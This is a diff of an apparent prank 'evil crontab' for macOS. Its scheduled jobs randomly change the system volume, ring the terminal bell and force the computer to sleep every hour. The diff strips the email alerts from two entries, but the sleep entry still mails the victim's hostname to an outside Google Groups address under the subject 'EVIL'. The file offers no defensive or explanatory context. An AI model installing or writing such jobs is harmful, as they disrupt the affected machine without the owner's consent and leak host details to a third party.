@@ -23,10 +23,10 @@
 ################################################################################
 
 # Keep changing the volume
-*/5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))" && (echo "Volume changed on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+*/5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))"
 
 # Make annoying sound once every 10 minutes
-*/10 * * * * tput bel && (echo "Annoying sound on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+*/10 * * * * tput bel
 
 # Go to sleep once every hour
 0 * * * * pmset sleepnow > /dev/null 2>&1 && (echo "Screen went to sleep on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
